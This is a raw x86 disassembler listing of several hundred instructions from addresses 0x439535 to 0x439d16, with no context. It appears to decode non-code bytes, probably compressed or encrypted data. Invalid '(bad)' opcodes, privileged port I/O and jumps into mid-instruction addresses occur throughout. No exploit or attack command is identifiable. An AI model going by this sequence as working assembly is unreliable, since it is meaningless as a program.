  439535:	repz mul eax
  439538:	mov    bh,0x32
  43953a:	fisub  WORD PTR [edi-0x280b55b6]
  439540:	xchg   ebp,eax
  439541:	in     al,dx
  439542:	out    0xc3,eax
  439544:	repz addr16 xor eax,0x74be8485
  43954b:	(bad)
  43954f:	arpl   WORD PTR ds:0x2ffe6b5,dx
  439555:	mov    ds:0x1c73cfa4,al
  43955a:	mov    dl,0x7c
  43955c:	mov    DWORD PTR [edi],esi
  43955e:	lods   eax,DWORD PTR ds:[esi]
  43955f:	cmp    dl,BYTE PTR [edi+0x6de0cde4]
  439565:	stc    
  439566:	mov    esi,0xf8421990
  43956b:	stos   DWORD PTR es:[edi],eax
  43956c:	xor    bh,BYTE PTR [edi-0x7223b93c]
  439572:	xor    eax,0x8f98c2a4
  439577:	(bad)  
  439578:	dec    ecx
  439579:	dec    ebx
  43957a:	and    al,0x1
  43957c:	jmp    0x6bc5a394
  439581:	and    al,BYTE PTR [edi-0x1b902e32]
  439587:	mov    dl,0x75
  439589:	dec    ecx
  43958a:	pop    ebp
  43958b:	gs inc edx
  43958d:	stos   BYTE PTR es:[edi],al
  43958e:	pop    edx
  43958f:	pop    esi
  439590:	lods   al,BYTE PTR ds:[esi]
  439591:	(bad)  
  439592:	test   eax,0x767f5623
  439597:	je     0x4395ec
  439599:	jbe    0x439594
  43959b:	jns    0x43956d
  43959d:	jle    0x43961d
  43959f:	ds or  al,0xc3
  4395a2:	or     DWORD PTR [ebx+0x523b0e82],0x7d
  4395a9:	in     al,0x85
  4395ab:	shl    DWORD PTR [edx+eiz*2],1
  4395ae:	out    0x5c,eax
  4395b0:	arpl   WORD PTR [ecx],di
  4395b2:	arpl   WORD PTR [ecx-0x4bc6c0f2],cx
  4395b8:	xor    bl,BYTE PTR [edx+0x1a]
  4395bb:	in     eax,0x3b
  4395bd:	push   es
  4395be:	fcom   QWORD PTR [edi+eax*4+0x63]
  4395c2:	ins    DWORD PTR es:[edi],dx
  4395c3:	inc    esp
  4395c4:	call   0x2a22:0x335ddfc7
  4395cb:	add    edx,eax
  4395cd:	add    eax,0xb22de29f
  4395d2:	dec    esp
  4395d3:	jle    0x4395c5
  4395d5:	in     al,0xc5
  4395d7:	jbe    0x43957a
  4395d9:	std    
  4395da:	cld    
  4395db:	clc    
  4395dc:	icebp  
  4395dd:	jecxz  0x4395d8
  4395df:	daa    
  4395e0:	int    0xe6
  4395e2:	je     0x43961c
  4395e4:	dec    edi
  4395e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4395e6:	xchg   edi,eax
  4395e7:	push   ds
  4395e8:	and    eax,0x34a1bcd5
  4395ed:	ins    DWORD PTR es:[edi],dx
  4395ee:	in     al,dx
  4395ef:	ficom  WORD PTR [esi-0x28756818]
  4395f5:	iret   
  4395f6:	push   esi
  4395f7:	rcr    BYTE PTR [ebp+0x59adcc9a],1
  4395fd:	xchg   edi,eax
  4395fe:	dec    ecx
  4395ff:	into   
  439600:	sbb    al,0x3b
  439602:	popf   
  439603:	add    edi,DWORD PTR [edx+0x43]
  439606:	daa    
  439607:	mov    dl,0x2b
  439609:	cdq    
  43960a:	clc    
  43960b:	cmp    DWORD PTR [ebx],0xffffff9e
  43960e:	dec    ebp
  43960f:	push   eax
  439610:	repz ret 
  439612:	xchg   esp,eax
  439613:	sti    
  439614:	stos   BYTE PTR es:[edi],al
  439615:	(bad)  
  439616:	sub    al,0xe2
  439618:	out    dx,al
  439619:	xchg   ecx,eax
  43961a:	shr    BYTE PTR [esi+0x5d],0x9
  43961e:	inc    edx
  43961f:	scas   eax,DWORD PTR es:[edi]
  439620:	xchg   BYTE PTR [ecx],al
  439622:	mov    bh,BYTE PTR [edi-0x51]
  439625:	aam    0x4f
  439627:	and    cl,ch
  439629:	pop    ebx
  43962a:	jp     0x4395b7
  43962c:	sar    ecx,cl
  43962e:	aad    0x4a
  439630:	inc    esp
  439631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439632:	fadd   st(7),st
  439634:	gs mov esi,0xaa89dacf
  43963a:	clc    
  43963b:	loop   0x439684
  43963d:	and    eax,ebx
  43963f:	ret    0x5f9
  439642:	std    
  439643:	inc    edi
  439644:	enter  0x8a23,0x0
  439648:	jecxz  0x43969b
  43964a:	aad    0xb8
  43964c:	cs popa 
  43964e:	iret   
  43964f:	jecxz  0x439630
  439651:	mov    al,ds:0xec0a96
  439656:	pop    esp
  439657:	outs   dx,DWORD PTR ds:[esi]
  439658:	daa    
  439659:	push   ds
  43965a:	imul   ecx,DWORD PTR [esi],0xc8072318
  439660:	dec    edi
  439661:	(bad)  
  439662:	xchg   ebx,eax
  439663:	or     bl,ah
  439665:	or     DWORD PTR [esi-0x6d],0xd03400e9
  43966c:	adc    DWORD PTR [esi+0x532cd8dd],0xfc2e95de
  439676:	sub    bl,BYTE PTR [edi+0x6a]
  439679:	pop    ss
  43967a:	sub    DWORD PTR [eax],edi
  43967c:	imul   ebp,DWORD PTR [ebp-0x5f],0xbc033ed0
  439683:	pop    esp
  439684:	mov    al,ds:0x5276ea08
  439689:	push   eax
  43968a:	(bad)  
  43968c:	out    0xac,eax
  43968e:	and    DWORD PTR [eax-0x54],ebx
  439691:	into   
  439692:	(bad)  
  439693:	addr16 daa 
  439695:	inc    ecx
  439696:	inc    eax
  439697:	adc    al,0x98
  439699:	mov    al,ds:0x59edd7a4
  43969e:	sub    bl,ch
  4396a0:	adc    edx,edi
  4396a2:	ror    dl,1
  4396a4:	fdiv   st,st(2)
  4396a6:	stos   DWORD PTR es:[edi],eax
  4396a7:	ret    
  4396a8:	cmp    eax,0x440c8ec8
  4396ad:	and    BYTE PTR [ebx],0xe4
  4396b0:	ficomp WORD PTR [eax-0x6f807d]
  4396b6:	retf   
  4396b7:	outs   dx,DWORD PTR ds:[esi]
  4396b8:	mov    bh,0xfe
  4396ba:	ror    BYTE PTR [esi+0x6d7d3b5f],0xd2
  4396c1:	push   ss
  4396c2:	xor    bh,al
  4396c4:	mov    dl,0x50
  4396c6:	dec    ebx
  4396c7:	inc    edi
  4396c8:	jo     0x4396e3
  4396ca:	add    BYTE PTR [edi],bl
  4396cc:	jo     0x4396bd
  4396ce:	in     eax,0xbb
  4396d0:	div    BYTE PTR [ebx-0x1d5b0eca]
  4396d6:	(bad)  
  4396d7:	je     0x439730
  4396d9:	jle    0x4396bf
  4396db:	or     al,0x6c
  4396dd:	pop    edx
  4396de:	xor    al,0x3
  4396e0:	dec    ecx
  4396e1:	aam    0x99
  4396e3:	sub    ebp,edx
  4396e5:	test   eax,0x58ecca9a
  4396ea:	test   eax,0x76b84cea
  4396ef:	add    eax,0x49f5e554
  4396f4:	(bad)  
  4396f5:	and    BYTE PTR [ecx+0x7c7c0cbe],ah
  4396fb:	mov    esi,0x78339cfa
  439700:	xor    BYTE PTR [edx+eiz*8+0xa],bl
  439704:	push   ebx
  439705:	fnstcw WORD PTR [edx-0x77]
  439708:	bnd js 0x4396e3
  43970b:	jb     0x43972f
  43970d:	addr16 xchg edi,eax
  43970f:	inc    ecx
  439710:	or     bh,BYTE PTR [edi+0x425d6c5f]
  439716:	xchg   ebp,eax
  439717:	add    eax,0x420677dd
  43971c:	aad    0x8c
  43971e:	test   BYTE PTR [eax-0x34f91430],cl
  439724:	inc    esi
  439725:	mov    bl,0x47
  439727:	test   BYTE PTR [eax],dl
  439729:	ror    al,cl
  43972b:	fiadd  WORD PTR [ebp+0x37a50f4d]
  439731:	stos   BYTE PTR es:[edi],al
  439732:	(bad)  
  439733:	pop    ebx
  439734:	pop    esp
  439735:	retf   
  439736:	or     BYTE PTR [eax+0x14],0x9c
  43973a:	ins    BYTE PTR es:[edi],dx
  43973b:	add    al,0xb
  43973d:	dec    eax
  43973e:	xor    DWORD PTR [esi],edx
  439740:	sub    al,0x64
  439742:	and    DWORD PTR [ebp-0x15323ca6],0xffffffbc
  439749:	mov    edi,0x96ccd19b
  43974e:	xchg   esp,eax
  43974f:	mov    ch,0xf8
  439751:	rcl    ebp,cl
  439753:	mov    edx,0x3c799980
  439758:	enter  0xa2b9,0x5e
  43975c:	push   0xffffffd2
  43975e:	(bad)  
  439760:	cmp    eax,ebx
  439762:	nop
  439763:	push   esi
  439764:	inc    ebp
  439765:	push   0x75
  439767:	xchg   ecx,eax
  439768:	inc    esi
  439769:	fimul  WORD PTR [eax+0xb]
  43976c:	dec    edi
  43976d:	imul   eax,DWORD PTR [ecx-0xf],0x1a
  439771:	ja     0x439796
  439773:	or     dl,BYTE PTR [ecx+0x3d]
  439776:	sbb    BYTE PTR [edx],0x6d
  439779:	sub    edx,DWORD PTR [ecx]
  43977b:	jo     0x4397ee
  43977d:	hlt    
  43977e:	retf   0xd632
  439781:	push   esp
  439782:	jo     0x439712
  439784:	sti    
  439785:	mov    eax,0x21399ac3
  43978a:	pop    ss
  43978b:	jo     0x439801
  43978d:	lock push 0xbf59c2e7
  439793:	in     al,0x97
  439795:	cmp    cl,al
  439797:	inc    ebx
  439798:	js     0x4397be
  43979a:	and    al,0x6e
  43979c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43979d:	repnz scas eax,DWORD PTR es:[edi]
  43979f:	sbb    BYTE PTR [eax+0x3627992],ah
  4397a5:	and    esi,DWORD PTR [edi-0x17]
  4397a8:	push   0x987bfccb
  4397ad:	pop    ebp
  4397ae:	adc    DWORD PTR [eax],edi
  4397b0:	push   0x75bba4b9
  4397b5:	push   0x9c0c5c1d
  4397ba:	push   cs
  4397bb:	mov    bl,0x3
  4397bd:	popf   
  4397be:	push   ebx
  4397bf:	pop    ecx
  4397c0:	mov    ch,0x5d
  4397c2:	inc    ecx
  4397c3:	xchg   DWORD PTR [edi],ebp
  4397c5:	add    dl,BYTE PTR [edx*4-0x8fb47b4]
  4397cc:	mov    esi,0xe3c4aa26
  4397d1:	xchg   DWORD PTR [eax-0x5f44d225],edx
  4397d7:	jl     0x4397cd
  4397d9:	mov    edx,0xbd98656c
  4397de:	dec    eax
  4397df:	mov    gs,WORD PTR [ecx-0x37268337]
  4397e5:	ficomp DWORD PTR [ebp-0x61]
  4397e8:	inc    ebp
  4397e9:	xchg   esp,eax
  4397ea:	ja     0x4397f6
  4397ec:	mov    eax,0x8e01f9c6
  4397f1:	mov    ?,WORD PTR [ecx]
  4397f3:	int    0x1a
  4397f5:	mov    ebx,0xc0de9064
  4397fa:	out    dx,al
  4397fb:	out    dx,al
  4397fc:	test   DWORD PTR [eax],ebp
  4397fe:	out    0x18,al
  439800:	dec    ebp
  439801:	adc    ecx,0x9fb1da4c
  439807:	mov    al,ds:0xb71f6835
  43980c:	inc    esp
  43980d:	sub    dh,ch
  43980f:	push   ds
  439810:	push   eax
  439811:	(bad)  
  439812:	arpl   WORD PTR [esi],cx
  439814:	mov    DWORD PTR [ecx+0x43],esi
  439817:	arpl   WORD PTR [esi+0x6b60f0c1],di
  43981d:	sbb    esp,ebx
  43981f:	xor    eax,DWORD PTR [eax-0x9]
  439822:	imul   eax,DWORD PTR [ebx+0x4f],0xfffffff5
  439826:	pop    DWORD PTR ds:0x1e42f84b
  43982c:	or     cl,al
  43982e:	shl    BYTE PTR [esi-0x47],1
  439831:	jbe    0x439860
  439833:	and    DWORD PTR [ebx],edi
  439835:	gs adc al,0x85
  439838:	jae    0x4397ba
  43983a:	test   BYTE PTR [ebx+0x21],0xa6
  43983e:	adc    ah,BYTE PTR [ebp+0x44c4433b]
  439844:	loop   0x4398b8
  439846:	out    0x79,eax
  439848:	ror    BYTE PTR [eax-0x157fa7b7],0x88
  43984f:	pop    ecx
  439850:	outs   dx,BYTE PTR ds:[esi]
  439851:	or     DWORD PTR [ebp-0x2ae690c6],ebp
  439857:	or     al,0x56
  439859:	pop    edx
  43985a:	dec    eax
  43985b:	mov    edi,0xfa1f53cd
  439860:	(bad)  
  439861:	cmp    ah,dl
  439863:	lahf   
  439864:	mov    gs,WORD PTR [edi]
  439866:	das    
  439867:	mov    DWORD PTR [ebx],edi
  439869:	(bad)  
  43986a:	fcomp  QWORD PTR [eax+0x76683629]
  439870:	jg     0x439874
  439872:	movzx  eax,WORD PTR [eax+0x44167074]
  439879:	mov    bh,BYTE PTR [ebp-0x5]
  43987c:	jne    0x43981c
  43987e:	dec    edx
  43987f:	xor    al,0xef
  439881:	pusha  
  439882:	test   DWORD PTR [esi-0x283e8bad],edi
  439888:	xor    eax,esi
  43988a:	add    BYTE PTR [esi+eiz*1-0x3ca61ba],dh
  439891:	adc    eax,0xe83b169a
  439896:	dec    esi
  439897:	adc    DWORD PTR [ecx-0x4f],ebp
  43989a:	ds ds adc al,0x9f
  43989e:	mov    ebx,esp
  4398a0:	fcomi  st,st(2)
  4398a2:	imul   edx,DWORD PTR [edi-0x58],0x855f838
  4398a9:	outs   dx,BYTE PTR ds:[esi]
  4398aa:	push   ebx
  4398ab:	and    BYTE PTR [ebx],bh
  4398ad:	into   
  4398ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4398af:	push   es
  4398b0:	gs pushf 
  4398b2:	sbb    DWORD PTR [ebp+0x5e8326b8],0xffffff96
  4398b9:	fcom   QWORD PTR [ebp+0x61]
  4398bc:	or     ebp,DWORD PTR [edi-0xb]
  4398bf:	mov    edx,0xb9c9ff4e
  4398c4:	test   eax,0xee9bf0c4
  4398c9:	add    BYTE PTR [ebx],al
  4398cb:	dec    DWORD PTR [edi]
  4398cd:	xchg   ebx,eax
  4398ce:	pop    es
  4398cf:	pop    esi
  4398d0:	and    al,0xc7
  4398d2:	pop    cx
  4398d4:	xor    dl,BYTE PTR ds:[ebx+0x44]
  4398d8:	jne    0x4398f7
  4398da:	retf   0x50ef
  4398dd:	push   ecx
  4398de:	unpckhps xmm6,XMMWORD PTR [edx+0x26]
  4398e2:	popf   
  4398e3:	rcl    al,0xd2
  4398e6:	sbb    BYTE PTR [edi],0xf9
  4398e9:	pushf  
  4398ea:	les    esp,FWORD PTR [ebp-0x7e6c8c15]
  4398f0:	stos   BYTE PTR es:[edi],al
  4398f1:	add    DWORD PTR [eax-0x6705decf],ecx
  4398f7:	ror    BYTE PTR [edx-0x38409d63],1
  4398fd:	icebp  
  4398fe:	fcomp  st(1)
  439900:	lods   eax,DWORD PTR ds:[esi]
  439901:	dec    esi
  439902:	and    eax,0xcec15b20
  439907:	jae    0x43992b
  439909:	inc    edx
  43990a:	aad    0xe4
  43990c:	adc    eax,0x2fc12244
  439911:	das    
  439912:	scas   eax,DWORD PTR es:[edi]
  439913:	sbb    BYTE PTR [ecx+esi*4],al
  439916:	out    dx,eax
  439917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439918:	pop    ds
  439919:	lds    ebx,FWORD PTR [eax+ecx*1+0x6d]
  43991d:	inc    eax
  43991e:	imul   esi,esp,0x99373b93
  439924:	adc    DWORD PTR [eax+0x53],ecx
  439927:	popa   
  439928:	in     eax,dx
  439929:	cmp    DWORD PTR cs:[edx+0x7b8b9578],edx
  439930:	dec    ebp
  439931:	outs   dx,DWORD PTR ds:[esi]
  439932:	cmp    DWORD PTR [ebp+0x52c8713],esi
  439938:	or     eax,0x852a6aec
  43993d:	mov    edi,0xb605f463
  439942:	pop    ebx
  439943:	push   ds
  439944:	sbb    eax,DWORD PTR [esi-0x59]
  439947:	push   cs
  439948:	and    al,0xa
  43994a:	xor    dh,al
  43994c:	pusha  
  43994d:	lock xor DWORD PTR [esi+0x4507a8f3],edi
  439954:	cmc    
  439955:	fcom   DWORD PTR [ebx+eax*4]
  439958:	push   esi
  439959:	mov    esi,0x90df1109
  43995e:	ficomp WORD PTR [edi-0x1886e885]
  439964:	jbe    0x439941
  439966:	sub    DWORD PTR [ecx-0x3f],eax
  439969:	push   0x35
  43996b:	jecxz  0x43994c
  43996d:	sar    BYTE PTR [edi+0x6706ba8],1
  439973:	push   ss
  439974:	mov    ebx,0x33bfb973
  439979:	jne    0x43999f
  43997b:	cwde   
  43997c:	jo     0x439927
  43997e:	jnp    0x4399ce
  439980:	inc    edx
  439981:	jmp    0x439958
  439983:	jge    0x4399d7
  439985:	repz les edx,FWORD PTR [esi-0x3c]
  439989:	(bad)  
  43998a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43998b:	fist   DWORD PTR [ebx-0x28]
  43998e:	push   esp
  43998f:	or     al,0xcd
  439991:	mov    bl,0xcc
  439993:	sbb    esi,ebp
  439995:	loope  0x439a14
  439997:	push   es
  439998:	hlt    
  439999:	sbb    DWORD PTR [ecx-0xf],esi
  43999c:	jp     0x4399de
  43999e:	mov    dl,0x92
  4399a0:	push   cs
  4399a1:	adc    ah,BYTE PTR fs:[edi]
  4399a4:	leave  
  4399a5:	jbe    0x439a09
  4399a7:	xchg   ecx,eax
  4399a8:	jecxz  0x439956
  4399aa:	mov    edi,0x7ca5bea9
  4399af:	jae    0x43998f
  4399b1:	mov    ah,0x4f
  4399b3:	pop    ebp
  4399b4:	ins    BYTE PTR es:[edi],dx
  4399b5:	jne    0x4399ba
  4399b7:	pop    esp
  4399b8:	repz inc esi
  4399ba:	or     al,0x89
  4399bc:	mov    ds:0x209fd8d5,al
  4399c1:	adc    DWORD PTR [edx-0x55a4703a],ebx
  4399c7:	or     al,0x4a
  4399c9:	add    al,0x17
  4399cb:	and    eax,0x202a4a42
  4399d0:	aas    
  4399d1:	dec    eax
  4399d2:	aam    0xf6
  4399d4:	int    0xdb
  4399d6:	rol    DWORD PTR [ebp-0x124844ee],cl
  4399dc:	iret   
  4399dd:	cmp    BYTE PTR [ecx+0x76751260],bl
  4399e3:	les    edi,FWORD PTR [edx]
  4399e5:	jle    0x439a5a
  4399e7:	int    0x84
  4399e9:	push   esp
  4399ea:	mov    ecx,0xb4010a41
  4399ef:	mov    BYTE PTR [edi+eax*1-0x72],bl
  4399f3:	add    al,0x37
  4399f5:	fsub   DWORD PTR [edx]
  4399f7:	adc    DWORD PTR ds:0x4f7f957,esp
  4399fd:	mov    cl,0xb0
  4399ff:	xor    BYTE PTR [ecx+eiz*1-0x69901b7f],dl
  439a06:	scas   al,BYTE PTR es:[edi]
  439a07:	mov    ah,0x89
  439a09:	push   eax
  439a0a:	mov    dh,0xe5
  439a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439a0d:	lahf   
  439a0e:	fsub   QWORD PTR [esi-0x47]
  439a11:	or     DWORD PTR [ebx-0x7d7e0797],esi
  439a17:	les    ecx,FWORD PTR [eax-0x77]
  439a1a:	pop    eax
  439a1b:	jne    0x4399a3
  439a1d:	gs jbe 0x439a71
  439a20:	clc    
  439a21:	jl     0x439a89
  439a23:	pop    es
  439a24:	adc    eax,0x988a65e9
  439a29:	mov    ebx,0xb43f6476
  439a2e:	daa    
  439a2f:	push   ds
  439a30:	test   al,0xcb
  439a32:	add    ecx,ebp
  439a34:	mov    esi,0x2fa99882
  439a39:	and    ch,BYTE PTR [esi+eax*4]
  439a3c:	fwait
  439a3d:	xchg   esp,eax
  439a3e:	bswap  edi
  439a40:	(bad)  
  439a41:	loopne 0x439a20
  439a43:	ins    BYTE PTR es:[edi],dx
  439a44:	dec    edi
  439a45:	cbw    
  439a47:	jmp    0x9c20:0xca5bc419
  439a4e:	jne    0x439acb
  439a50:	in     al,dx
  439a51:	and    DWORD PTR [eax],edx
  439a53:	and    BYTE PTR [eax+0x60],0xda
  439a57:	repz xor al,0x33
  439a5a:	pop    ebx
  439a5b:	pop    eax
  439a5c:	sbb    DWORD PTR [eax],esi
  439a5e:	add    cl,BYTE PTR [esi-0x234697ad]
  439a64:	pop    ebp
  439a65:	imul   esi,DWORD PTR [ebp-0x29],0xfffffff0
  439a69:	xchg   DWORD PTR [edx-0x64],esi
  439a6c:	and    al,0x9
  439a6e:	or     dl,al
  439a70:	mov    DWORD PTR ds:0x6e02cf79,esi
  439a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439a77:	cdq    
  439a78:	push   esi
  439a79:	lods   eax,DWORD PTR ds:[esi]
  439a7a:	ja     0x439afb
  439a7c:	fstp   DWORD PTR [edx]
  439a7e:	cmp    ah,BYTE PTR ds:0x29bf0c6e
  439a84:	ret    0xa597
  439a87:	mov    ebp,0xf8a4bc96
  439a8c:	pop    esi
  439a8d:	push   edi
  439a8e:	xchg   BYTE PTR [ecx+0xbde12b7],ah
  439a94:	dec    ax
  439a96:	cmp    dl,0x8f
  439a99:	mov    ss,WORD PTR [ebx]
  439a9b:	in     eax,dx
  439a9c:	leave  
  439a9d:	dec    ebx
  439a9f:	mov    dl,0xf5
  439aa1:	(bad)  
  439aa2:	loopne 0x439af7
  439aa4:	ror    BYTE PTR [eax-0x6deb1145],0x92
  439aab:	or     al,0x7b
  439aad:	fisub  DWORD PTR [ebp+eiz*1-0x67]
  439ab1:	mov    bh,0x17
  439ab3:	mov    ebx,0x771cb068
  439ab8:	mov    BYTE PTR [ebp+ebx*2-0x15dbec71],cl
  439abf:	ins    BYTE PTR es:[edi],dx
  439ac0:	push   DWORD PTR [esi+0x2]
  439ac3:	fidivr WORD PTR [ecx]
  439ac5:	xor    BYTE PTR [esi],dl
  439ac7:	xchg   ecx,eax
  439ac8:	in     eax,dx
  439ac9:	cmp    eax,0x7455637f
  439ace:	jg     0x439b37
  439ad0:	jle    0x439a85
  439ad2:	inc    eax
  439ad3:	push   edx
  439ad4:	dec    edx
  439ad5:	lods   eax,DWORD PTR ds:[esi]
  439ad6:	dec    ebp
  439ad7:	xchg   DWORD PTR [esp+eax*1-0x5f],esp
  439adb:	dec    ecx
  439adc:	in     eax,dx
  439add:	and    al,0x7c
  439adf:	jbe    0x439afb
  439ae1:	fist   WORD PTR ds:0x858b1a58
  439ae7:	mov    ch,0xa3
  439ae9:	jo     0x439ab9
  439aeb:	cmp    esi,DWORD PTR [esi]
  439aed:	and    ah,BYTE PTR [edx+ebx*4]
  439af0:	and    al,ah
  439af2:	mov    ebx,0x2b825b79
  439af7:	or     DWORD PTR [ebx],esi
  439af9:	sbb    al,0x6f
  439afb:	stos   BYTE PTR es:[edi],al
  439afc:	cmp    al,0x74
  439afe:	and    DWORD PTR [ebx-0x5d9c04d1],edi
  439b04:	mov    ebx,DWORD PTR gs:[ebx+0x300a70a]
  439b0b:	dec    edx
  439b0c:	(bad)  
  439b0d:	pop    ss
  439b0e:	icebp  
  439b0f:	pop    ds
  439b10:	fwait
  439b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439b12:	aas    
  439b13:	(bad)  
  439b14:	ds mov eax,0xc59742b0
  439b1a:	aaa    
  439b1b:	mov    cl,0xed
  439b1d:	xchg   DWORD PTR [edi+0x3122e300],edx
  439b23:	lock add edx,DWORD PTR [edx+0x5e94be3b]
  439b2a:	(bad)  
  439b2b:	or     DWORD PTR [ebx-0x7a],eax
  439b2e:	in     al,dx
  439b2f:	xchg   cl,dl
  439b31:	xchg   edi,eax
  439b32:	mov    cl,0x51
  439b34:	mul    esi
  439b36:	repnz xchg ebp,eax
  439b38:	jae    0x439b76
  439b3a:	add    ah,BYTE PTR [ecx]
  439b3c:	lea    esp,[edi+0x4ebd7d92]
  439b42:	(bad)  
  439b43:	stos   BYTE PTR es:[edi],al
  439b44:	jnp    0x439adf
  439b46:	mov    ebp,0x6d4004e
  439b4b:	scas   al,BYTE PTR es:[edi]
  439b4c:	popf   
  439b4d:	inc    esp
  439b4e:	jl     0x439bcc
  439b50:	xacquire xchg DWORD PTR [edx-0x63],edi
  439b54:	jg     0x439b5b
  439b56:	enter  0x41f3,0x90
  439b5a:	ins    DWORD PTR es:[edi],dx
  439b5b:	mov    dh,0x86
  439b5d:	lock mov dl,0x64
  439b60:	cmp    al,bh
  439b62:	xor    ch,BYTE PTR [edi]
  439b64:	cmp    al,dh
  439b66:	xchg   ebp,eax
  439b67:	adc    DWORD PTR [eax+0x5e],0x9d249449
  439b6e:	inc    ebp
  439b6f:	clc    
  439b70:	mov    edx,eax
  439b72:	sub    bl,BYTE PTR [ebx+edx*4+0x7bf84830]
  439b79:	fucomp st(6)
  439b7b:	imul   DWORD PTR [esi]
  439b7d:	outs   dx,BYTE PTR ds:[esi]
  439b7e:	rol    ecx,0x37
  439b81:	repnz cmp esi,DWORD PTR [esi]
  439b84:	fst    QWORD PTR [edx-0x71ac1ef]
  439b8a:	inc    esi
  439b8b:	(bad)  
  439b8c:	adc    al,ch
  439b8e:	retf   0x756b
  439b91:	dec    ebx
  439b92:	fwait
  439b93:	add    esp,ecx
  439b95:	add    eax,DWORD PTR [eax]
  439b97:	(bad)  
  439b98:	repnz fst DWORD PTR [esi+0x1303296]
  439b9f:	repz cmp al,0xe
  439ba2:	sar    DWORD PTR [ebp+0x48],1
  439ba5:	loop   0x439be6
  439ba7:	repz aam 0x88
  439baa:	shr    BYTE PTR [edx+0x2ca0e797],cl
  439bb0:	jmp    0xf9c9:0x43950872
  439bb7:	mov    esp,DWORD PTR [edi+0xb]
  439bba:	or     al,0x31
  439bbc:	mov    edx,0xe4aa6013
  439bc1:	pop    ebp
  439bc2:	pop    ebp
  439bc3:	mov    ecx,0xcef62e27
  439bc8:	cmp    eax,0x7ec5baa9
  439bcd:	jmp    0x439b93
  439bcf:	fdivr  QWORD PTR [ebp-0x54b62c97]
  439bd5:	inc    ebp
  439bd6:	dec    ecx
  439bd7:	test   al,0xb8
  439bd9:	mov    bl,bl
  439bdb:	popf   
  439bdc:	dec    ebx
  439bdd:	push   esi
  439bde:	mov    al,0x9f
  439be0:	xor    eax,0x33ca0593
  439be5:	push   ss
  439be6:	add    ah,BYTE PTR [ecx]
  439be8:	arpl   WORD PTR [ebx],bp
  439bea:	test   BYTE PTR ds:0x1b3cc874,bh
  439bf0:	ret    0xe247
  439bf3:	rcr    dl,0x2b
  439bf6:	or     DWORD PTR [ebp+0x413de63e],edi
  439bfc:	ret    0x5717
  439bff:	dec    esp
  439c00:	mov    eax,0x315b1787
  439c05:	pop    ss
  439c06:	icebp  
  439c07:	fnstenv [esi+0x74207343]
  439c0d:	or     edx,ecx
  439c0f:	aam    0x9a
  439c11:	xchg   esi,eax
  439c12:	dec    edx
  439c13:	out    0xd4,al
  439c15:	ret    0x4fe3
  439c18:	pop    ss
  439c19:	test   DWORD PTR [eax-0x769b92f0],edx
  439c1f:	nop
  439c20:	jmp    0x12b2:0x2fbcc867
  439c27:	jno    0x439bf4
  439c29:	push   0x865c0b24
  439c2e:	jmp    0xc262:0xc19e5cbd
  439c35:	mov    al,0x4
  439c37:	in     al,dx
  439c38:	fbld   TBYTE PTR [ecx+0x2fbacaad]
  439c3e:	loop   0x439c9d
  439c40:	aad    0x3c
  439c42:	dec    DWORD PTR ss:[esi-0x7109a74]
  439c49:	shld   DWORD PTR [ebp+0x4],esi,cl
  439c4d:	mov    dh,BYTE PTR [ebx]
  439c4f:	adc    DWORD PTR [edx*8+0x22ac7b15],edx
  439c56:	sub    eax,0x8d67040d
  439c5b:	sbb    bl,BYTE PTR [ebp+0x63d1ee53]
  439c61:	int3   
  439c62:	jl     0x439cd0
  439c64:	jmp    FWORD PTR [ebp+0x43]
  439c67:	jmp    0x502d3f0b
  439c6c:	out    0xe,al
  439c6e:	(bad)  
  439c70:	jb     0x439c44
  439c72:	jbe    0x439cc1
  439c74:	or     DWORD PTR [ecx],ecx
  439c76:	cmp    al,BYTE PTR [esi+edi*2-0x66]
  439c7a:	dec    ecx
  439c7b:	cld    
  439c7c:	xchg   edx,eax
  439c7d:	test   edx,ebx
  439c7f:	retf   0x5bfc
  439c82:	clc    
  439c83:	sahf   
  439c84:	cwde   
  439c85:	mov    esi,0x3d9d43c9
  439c8a:	mov    cl,0xd6
  439c8c:	jbe    0x439c1c
  439c8e:	push   edx
  439c8f:	dec    edi
  439c90:	retf   
  439c91:	jno    0x439c79
  439c93:	push   es
  439c94:	cs (bad) 
  439c96:	xor    dl,bl
  439c98:	(bad)  
  439c99:	sbb    BYTE PTR [eax+0x32],0xa6
  439c9d:	rol    BYTE PTR gs:[edx],0xfe
  439ca1:	mov    ecx,DWORD PTR [eax+0x1d7ef41b]
  439ca7:	dec    ecx
  439ca8:	ror    DWORD PTR [ebx-0x341a9fe8],0xcf
  439caf:	loopne 0x439d02
  439cb1:	push   eax
  439cb2:	xchg   edi,eax
  439cb3:	push   0x4d
  439cb5:	pop    ebp
  439cb6:	pop    esp
  439cb7:	lahf   
  439cb8:	push   ebx
  439cb9:	retf   
  439cba:	or     ecx,ebx
  439cbc:	cmp    DWORD PTR [ebx+ebp*8],edx
  439cbf:	jecxz  0x439ced
  439cc1:	sub    al,0xda
  439cc3:	xlat   BYTE PTR ds:[ebx]
  439cc4:	mul    DWORD PTR [edx+0x47b86efa]
  439cca:	loop   0x439ceb
  439ccc:	cmp    BYTE PTR gs:[ebp-0x75bf8588],0x3c
  439cd4:	arpl   di,dx
  439cd6:	into   
  439cd7:	mov    bl,0x3a
  439cd9:	sbb    eax,0xd77fcec7
  439cde:	popf   
  439cdf:	xchg   edi,eax
  439ce0:	(bad)
  439ce4:	cmp    ebx,DWORD PTR ds:0x8a83c6cb
  439cea:	mov    ds:0x13f9e20,eax
  439cef:	xlat   BYTE PTR ds:[ebx]
  439cf0:	xchg   ecx,eax
  439cf1:	not    DWORD PTR [esi+0x76bd6d61]
  439cf7:	push   esp
  439cf8:	xchg   ecx,eax
  439cf9:	inc    ebp
  439cfa:	fldcw  WORD PTR [ecx]
  439cfc:	mov    edi,0x45419967
  439d01:	sub    eax,0xe0f80567
  439d06:	inc    ecx
  439d07:	xor    eax,0x253c9219
  439d0c:	xor    ah,BYTE PTR [esp+eax*2]
  439d0f:	outs   dx,BYTE PTR ds:[esi]
  439d10:	jmp    0xcb8a60d3
  439d15:	pop    ds
  439d16:	add    DWORD PTR [esi+0x65],esp
